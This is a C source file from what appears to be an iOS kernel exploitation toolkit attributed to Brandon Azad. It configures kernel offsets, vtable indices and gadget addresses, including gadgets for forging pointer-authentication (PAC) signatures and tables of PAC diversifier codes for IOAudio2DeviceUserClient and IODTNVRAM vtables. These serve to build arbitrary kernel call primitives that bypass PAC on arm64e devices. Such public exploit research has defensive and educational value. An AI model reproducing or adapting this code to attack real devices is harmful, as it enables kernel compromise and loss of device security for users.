/*
 * kernel_call/kc_parameters.c
 * Brandon Azad
 */
#define KERNEL_CALL_PARAMETERS_EXTERN
#include "kc_parameters.h"

#include "kernel_slide.h"
#include "log.h"
#include "platform.h"
#include "platform_match.h"
#include "KernelUtilities.h"

// ---- Initialization routines -------------------------------------------------------------------

// A struct describing an initialization.
struct initialization {
	const char *devices;
	const char *builds;
	void (*init)(void);
};

// Run initializations matching this platform.
static size_t
run_initializations(struct initialization *inits, size_t count) {
	size_t match_count = 0;
	for (size_t i = 0; i < count; i++) {
		struct initialization *init = &inits[i];
		if (platform_matches(init->devices, init->builds)) {
			init->init();
			match_count++;
		}
	}
	return match_count;
}

// A helper macro to get the number of elements in a static array.
#define ARRAY_COUNT(x)	(sizeof(x) / sizeof((x)[0]))

// ---- Offset initialization ---------------------------------------------------------------------

static void
offsets__iphone11_8__16C50() {
	OFFSET(IOAudio2DeviceUserClient, traps) = 0x118;

	SIZE(IOExternalTrap)             = 0x18;
	OFFSET(IOExternalTrap, object)   =  0;
	OFFSET(IOExternalTrap, function) =  8;
	OFFSET(IOExternalTrap, offset)   = 16;

	OFFSET(IORegistryEntry, reserved)                        = 16;
	OFFSET(IORegistryEntry__ExpansionData, fRegistryEntryID) = 8;

	VTABLE_INDEX(IOUserClient, getExternalTrapForIndex)  = 0x5B8 / 8;
	VTABLE_INDEX(IOUserClient, getTargetAndTrapForIndex) = 0x5C0 / 8;
}

// A list of offset initializations by platform.
static struct initialization offsets[] = {
	{ "*", "*", offsets__iphone11_8__16C50 },
};

// ---- Address initialization --------------------------------------------------------------------

#define SLIDE(address)		(address == 0 ? 0 : address + kernel_slide)

static void
addresses__iphone11_2__16A366() {
    ADDRESS(paciza_pointer__l2tp_domain_module_start)       = getoffset(paciza_pointer__l2tp_domain_module_start);
    ADDRESS(paciza_pointer__l2tp_domain_module_stop)        = getoffset(paciza_pointer__l2tp_domain_module_stop);
    ADDRESS(l2tp_domain_inited)                             = getoffset(l2tp_domain_inited);
    ADDRESS(sysctl__net_ppp_l2tp)                           = getoffset(sysctl__net_ppp_l2tp);
    ADDRESS(sysctl_unregister_oid)                          = getoffset(sysctl_unregister_oid);
    ADDRESS(mov_x0_x4__br_x5)                               = getoffset(mov_x0_x4__br_x5);
    ADDRESS(mov_x9_x0__br_x1)                               = getoffset(mov_x9_x0__br_x1);
    ADDRESS(mov_x10_x3__br_x6)                              = getoffset(mov_x10_x3__br_x6);
    ADDRESS(kernel_forge_pacia_gadget)                      = getoffset(kernel_forge_pacia_gadget);
    ADDRESS(kernel_forge_pacda_gadget)                      = getoffset(kernel_forge_pacda_gadget);
    SIZE(kernel_forge_pacxa_gadget_buffer)                  = 0x110;
    OFFSET(kernel_forge_pacxa_gadget_buffer, first_access)  = 0xe8;
    OFFSET(kernel_forge_pacxa_gadget_buffer, pacia_result)  = 0xf0;
    OFFSET(kernel_forge_pacxa_gadget_buffer, pacda_result)  = 0xe8;
    ADDRESS(IOUserClient__vtable)                           = getoffset(IOUserClient__vtable);
    ADDRESS(IORegistryEntry__getRegistryEntryID)            = getoffset(IORegistryEntry__getRegistryEntryID);
}

// A list of address initializations by platform.
static struct initialization addresses[] = {
	{ "*", "16A366-16D5024a", addresses__iphone11_2__16A366  },
};

// ---- PAC initialization ------------------------------------------------------------------------

#if __arm64e__

static void
pac__iphone11_8__16C50() {
	INIT_VTABLE_PAC_CODES(IOAudio2DeviceUserClient,
			0x3771, 0x56b7, 0xbaa2, 0x3607, 0x2e4a, 0x3a87, 0x89a9, 0xfffc,
			0xfc74, 0x5635, 0xbe60, 0x32e5, 0x4a6a, 0xedc5, 0x5c68, 0x6a10,
			0x7a2a, 0xaf75, 0x137e, 0x0655, 0x43aa, 0x12e9, 0x4578, 0x4275,
			0xff53, 0x1814, 0x122e, 0x13f6, 0x1d35, 0xacb1, 0x7eb0, 0x1262,
			0x82eb, 0x164e, 0x37a5, 0xb659, 0x6c51, 0xa20f, 0xb3b6, 0x6bcb,
			0x5a20, 0x5062, 0x00d7, 0x7c85, 0x8a26, 0x3539, 0x688b, 0x1e60,
			0x1955, 0x0689, 0xc256, 0xa383, 0xf021, 0x1f0a, 0xb4bb, 0x8ffc,
			0xb5b9, 0x8764, 0x5d96, 0x80d9, 0x0c9c, 0x5d0a, 0xcbcc, 0x617d,
			0x848a, 0x2312, 0x3540, 0xc257, 0x3025, 0x9fc2, 0x5038, 0xc666,
			0x6cc3, 0x550c, 0xa19a, 0xa51b, 0x4577, 0x573c, 0x1a4e, 0x6c3d,
			0xb049, 0xc4b2, 0xc90d, 0x7d59, 0x4897, 0x3c68, 0xb085, 0x4529,
			0x639f, 0xccfb, 0x55eb, 0xe933, 0xaec3, 0x5ec5, 0x5219, 0xc6b2,
			0x8a43, 0x4a20, 0xd9f2, 0x981a, 0xa27f, 0xc4f9, 0x6b87, 0x60a1,
			0x7e78, 0x36aa, 0x86ef, 0x9be9, 0x7318, 0x93b7, 0x638e, 0x61a6,
			0x9175, 0x136b, 0xdb58, 0x4a31, 0x0988, 0x5393, 0xabe0, 0x0ad9,
			0x6c99, 0xd52d, 0xe213, 0x308f, 0xd78d, 0x3a1d, 0xa390, 0x240b,
			0x1b89, 0x8d3c, 0x2652, 0x7f14, 0x0759, 0x63c4, 0x800f, 0x9cc2,
			0x02ac, 0x785f, 0xcc6b, 0x82cd, 0x808e, 0x37ce, 0xa4c7, 0xe8de,
			0xa343, 0x4bc0, 0xf8a6, 0xac7f, 0x7974, 0xea1b, 0x4b35, 0x9eb4,
			0x595a, 0x5b2b, 0x699e, 0x2b52, 0xf40e, 0x0ddb, 0x0f88, 0x8700,
			0x36c3, 0x058e, 0xf16e, 0x3a71, 0xda1e, 0x10b6, 0x8654, 0xb352,
			0xa03f, 0xbde5, 0x5cf5, 0x18b8, 0xea14, 0x3e51, 0xbcef, 0xfd2b,
			0xc1ba, 0x02d4, 0xee4f, 0x3565, 0xb50c, 0xbdaa, 0xbc5e, 0xea23,
			0x2bcb);
  
  INIT_VTABLE_PAC_CODES(IODTNVRAM,
      0x3771, 0x56b7, 0xbaa2, 0x3607, 0x2e4a, 0x3a87, 0x89a9, 0xfffc,
      0xfc74, 0x5635, 0xbe60, 0x32e5, 0x4a6a, 0xedc5, 0x5c68, 0x6a10,
      0x7a2a, 0xaf75, 0x137e, 0x0655, 0x43aa, 0x12e9, 0x4578, 0x4275,
      0xff53, 0x1814, 0x122e, 0x13f6, 0x1d35, 0xacb1, 0x7eb0, 0x1262,
      0x82eb, 0x164e, 0x37a5, 0xb659, 0x6c51, 0xa20f, 0xb3b6, 0x6bcb,
      0x5a20, 0x5062, 0x00d7, 0x7c85, 0x8a26, 0x3539, 0x688b, 0x1e60,
      0x1955, 0x0689, 0xc256, 0xa383, 0xf021, 0x1f0a, 0xb4bb, 0x8ffc,
      0xb5b9, 0x8764, 0x5d96, 0x80d9, 0x0c9c, 0x5d0a, 0xcbcc, 0x617d,
      0x848a, 0x2312, 0x3540, 0xc257, 0x3025, 0x9fc2, 0x5038, 0xc666,
      0x6cc3, 0x550c, 0xa19a, 0xa51b, 0x4577, 0x573c, 0x1a4e, 0x6c3d,
      0xb049, 0xc4b2, 0xc90d, 0x7d59, 0x4897, 0x3c68, 0xb085, 0x4529,
      0x639f, 0xccfb, 0x55eb, 0xe933, 0xaec3, 0x5ec5, 0x5219, 0xc6b2,
      0x8a43, 0x4a20, 0xd9f2, 0x981a, 0xa27f, 0xc4f9, 0x6b87, 0x60a1,
      0x7e78, 0x36aa, 0x86ef, 0x9be9, 0x7318, 0x93b7, 0x638e, 0x61a6,
      0x9175, 0x136b, 0xdb58, 0x4a31, 0x0988, 0x5393, 0xabe0, 0x0ad9,
      0x6c99, 0xd52d, 0xe213, 0x308f, 0xd78d, 0x3a1d, 0xa390, 0x240b,
      0x1b89, 0x8d3c, 0x2652, 0x7f14, 0x0759, 0x63c4, 0x800f, 0x9cc2,
      0x02ac, 0x785f, 0xcc6b, 0x82cd, 0x808e, 0x37ce, 0xa4c7, 0xe8de,
      0xa343, 0x4bc0, 0xf8a6, 0xac7f, 0x7974, 0xea1b, 0x4b35, 0x9eb4,
      0x595a, 0x5b2b, 0x699e, 0x2b52, 0xf40e, 0x0ddb, 0x0f88, 0x8700,
      0x36c3, 0x058e, 0xf16e, 0x3a71, 0xda1e, 0x10b6, 0x8654, 0xb428,
      0xbd46, 0xe5f5, 0x61a4, 0xdb15, 0x414e, 0xebdb, 0x5599, 0x4584,
      0x4909, 0x003b, 0xafd8, 0xf53e, 0xfbd7, 0xcf34, 0x14d5, 0xb201,
      0x3e63, 0x110c, 0x7ed3, 0x6731, 0x7a38, 0xd4c7, 0xa3bc, 0xc7b7,
      0xb1db, 0x7d35, 0xb06d, 0xcf08);
}

// A list of PAC initializations by platform.
static struct initialization pac_codes[] = {
	{ "*", "*", pac__iphone11_8__16C50 },
};

#endif // __arm64e__

// ---- Public API --------------------------------------------------------------------------------

bool
kernel_call_parameters_init() {
	bool ok = kernel_slide_init();
	if (!ok) {
		return false;
	}
	size_t count = run_initializations(offsets, ARRAY_COUNT(offsets));
	if (count < 1) {
		ERROR("no kernel_call %s for %s %s", "offsets",
				platform.machine, platform.osversion);
		return false;
	}
	count = run_initializations(addresses, ARRAY_COUNT(addresses));
	if (count < 1) {
		ERROR("no kernel_call %s for %s %s", "addresses",
				platform.machine, platform.osversion);
		return false;
	}
#if __arm64e__
	count = run_initializations(pac_codes, ARRAY_COUNT(pac_codes));
	if (count < 1) {
		ERROR("no kernel_call %s for %s %s", "PAC codes",
				platform.machine, platform.osversion);
		return false;
	}
#endif // __arm64e__
	return true;
}
